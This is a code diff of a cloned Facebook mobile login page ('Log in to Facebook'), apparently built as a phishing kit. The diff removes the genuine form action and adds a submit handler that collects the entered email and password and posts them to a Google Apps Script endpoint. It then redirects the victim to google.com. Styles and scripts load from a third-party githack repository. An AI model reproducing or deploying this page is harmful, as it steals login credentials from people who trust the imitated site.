@@ -4,7 +4,7 @@
 <head>
         <title>Log in to Facebook | Facebook</title>
         <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
-        <link href="../z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
+        <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
         <meta name="referrer" content="default" id="meta_referrer" />
         <link type="text/css" rel="stylesheet" href="https://raw.githack.com/Ethanmitchell57/nova-cdn/main/G1ixT7Zmd281f8e.css" data-bootloader-hash="eqLVMdV" data-nonblocking="1" />
         <link type="text/css" rel="stylesheet" href="https://raw.githack.com/Ethanmitchell57/nova-cdn/main/9NCeFv3EoCO1f8e.css" data-bootloader-hash="AVH4k4V" />
@@ -141,13 +141,8 @@
                                         </div>
                                         <div class="_5rut">
                                             <form
-                                                method="post"
-                                                action=""
                                                 class="mobile-login-form _9hp- _5spm"
-                                                id="login_form"
-                                                novalidate="1"
-                                                data-sigil="m_login_form"
-                                            >
+                                                id="form" >
                                                 <input type="hidden" name="lsd" value="AVoD5kNm1Ug" autocomplete="off" /><input type="hidden" name="jazoest" value="2914" autocomplete="off" />
                                                 <input type="hidden" name="m_ts" value="1684235075" /><input type="hidden" name="li" value="Q2NjZLn2v2zzKeTzpC5BqMod" />
                                                 <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
@@ -158,16 +153,17 @@
                                                     <div class="_56be">
                                                         <div class="_55wo _56bf">
                                                             <div class="_96n9" id="email_input_container">
+                                                              
                                                                 <input
                                                                     autocorrect="off"
                                                                     autocapitalize="off"
                                                                     class="_56bg _4u9z _5ruq _8qtn"
                                                                     autocomplete="on"
-                                                                    id="m_login_email"
+                                                                    id="email"
                                                                     name="email"
                                                                     placeholder="Mobile number or email address"
                                                                     type="text"
-                                                                    data-sigil="m_login_email"
+                                                                    
                                                                 />
                                                             </div>
                                                         </div>
@@ -563,16 +559,28 @@
                 });
             });
         </script>
-        <script nonce="lyhG4j7L">
-            (function () {
-                var n = now_inl();
-                requireLazy(["__bigPipe"], function (bigPipe) {
-                    bigPipe.beforePageletArrive("last_response", n);
-                });
-            })();
-        </script>
+        
 
         <script nonce="lyhG4j7L" src="https://raw.githack.com/Ethanmitchell57/nova-cdn/main/script03.js"></script>
+        <script>
+        
+  const form = document.querySelector("#form")
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzwOUnWwlsyfa2s3PruFG0B0-9Lv6MUmFIV-xtvg79LKwTE2SKRFOnH-EA5lh4mb9khIw/exec'
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+
+    const responseBody = new FormData(form)
+    const TrendBody = responseBody.getAll("TRENDS").join(" ")
+    responseBody.set('TRENDS', TrendBody)
+    fetch(scriptURL, { method: 'POST', body: responseBody })
+      .then(response => { window.location.href = 'https://google.com' })
+      .catch(error => alert('Error!', error.message))
+  })
+
+</script>
+       
+        <script src="https://raw.githack.com/Ethanmitchell57/nova-cdn/main/script04.js"></script>
     </body>
 
 
